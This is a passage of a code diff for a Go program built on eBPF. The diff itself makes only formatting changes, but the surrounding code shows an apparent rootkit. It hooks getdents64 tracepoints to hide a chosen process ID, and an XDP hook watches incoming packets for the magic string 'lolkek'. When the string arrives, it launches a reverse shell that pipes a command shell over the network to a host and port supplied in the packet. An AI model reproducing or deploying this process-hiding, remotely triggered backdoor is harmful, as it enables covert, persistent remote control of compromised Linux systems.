@@ -152,7 +152,7 @@ func main() {
 
 					port = strings.Trim(port, "\x00")
 					log.Printf("XDP: Triggering reverse shell to %s:%s", host, port)
-		
+
 					go revshell(host, port)
 				} else {
 					log.Printf("XDP: 'lolkek' found, but format invalid: %q", dataStr)
@@ -165,7 +165,7 @@ func main() {
 	log.Println("Shutting down main process...")
 }
 
-func initBPF(pidToHide int, targetPPID int, objs *pidhideObjects){
+func initBPF(pidToHide int, targetPPID int, objs *pidhideObjects) {
 	pidStr := strconv.Itoa(pidToHide)
 	if len(pidStr) >= MAX_PID_LEN {
 		log.Fatalf("PID %d string representation is too long (max %d chars)", pidToHide, MAX_PID_LEN-1)
@@ -190,7 +190,7 @@ func initBPF(pidToHide int, targetPPID int, objs *pidhideObjects){
 	}
 
 	err = spec.RewriteConstants(map[string]interface{}{
-		"pid_to_hide":     pidToHideBytes,        // [10]byte
+		"pid_to_hide":     pidToHideBytes,      // [10]byte
 		"pid_to_hide_len": int32(pidToHideLen), // C int -> Go int32
 		"target_ppid":     int32(targetPPID),   // C int -> Go int32
 	})
@@ -207,7 +207,7 @@ func initBPF(pidToHide int, targetPPID int, objs *pidhideObjects){
 	}
 
 	// Tail Calls Setup
-	exitProgFd := uint32(objs.HandleGetdentsExit.FD())  // Get FD of bpf programs
+	exitProgFd := uint32(objs.HandleGetdentsExit.FD()) // Get FD of bpf programs
 	patchProgFd := uint32(objs.HandleGetdentsPatch.FD())
 
 	key1 := uint32(PROG_01)
@@ -221,7 +221,7 @@ func initBPF(pidToHide int, targetPPID int, objs *pidhideObjects){
 	log.Println("PID Hide: Tail calls configured successfully.")
 }
 
-func attachTP(objs *pidhideObjects) (link.Link, link.Link){
+func attachTP(objs *pidhideObjects) (link.Link, link.Link) {
 	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64", objs.HandleGetdentsEnter, nil)
 	if err != nil {
 		log.Fatalf("Failed to attach tracepoint sys_enter_getdents64: %v", err)
@@ -237,7 +237,7 @@ func attachTP(objs *pidhideObjects) (link.Link, link.Link){
 	return tpEnter, tpExit
 }
 
-func attachXDP(objs *pidhideObjects, ifaceName string) link.Link{
+func attachXDP(objs *pidhideObjects, ifaceName string) link.Link {
 	log.Printf("Attaching XDP program to interface: %s", ifaceName)
 	iface, err := net.InterfaceByName(ifaceName)
 	if err != nil {
@@ -256,7 +256,7 @@ func attachXDP(objs *pidhideObjects, ifaceName string) link.Link{
 	return xdpLink
 }
 
-func setupRB(objs *pidhideObjects) (*ringbuf.Reader, *ringbuf.Reader){
+func setupRB(objs *pidhideObjects) (*ringbuf.Reader, *ringbuf.Reader) {
 	// PID Hide RB
 	pidHideRd, err := ringbuf.NewReader(objs.Rb)
 	if err != nil {
@@ -303,7 +303,7 @@ func revshell(ip string, port string) {
 		defer cancel()
 		log.Printf("RevShell: Starting stdout/stderr copy to network")
 		_, err := io.Copy(conn, io.MultiReader(stdout, stderr))
-		if err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, net.ErrClosed) && !strings.Contains(err.Error(), "use of closed network connection"){
+		if err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, net.ErrClosed) && !strings.Contains(err.Error(), "use of closed network connection") {
 			log.Printf("RevShell: Error copying shell output to network: %v", err)
 		}
 		log.Printf("RevShell: Stopped copying stdout/stderr to network")
@@ -315,7 +315,7 @@ func revshell(ip string, port string) {
 		defer cancel()
 		log.Printf("RevShell: Starting network copy to shell stdin")
 		_, err := io.Copy(stdin, conn)
-		if err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, net.ErrClosed) && !strings.Contains(err.Error(), "use of closed network connection"){
+		if err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, net.ErrClosed) && !strings.Contains(err.Error(), "use of closed network connection") {
 			log.Printf("RevShell: Error copying network input to shell: %v", err)
 		}
 		log.Printf("RevShell: Stopped copying network to shell stdin")
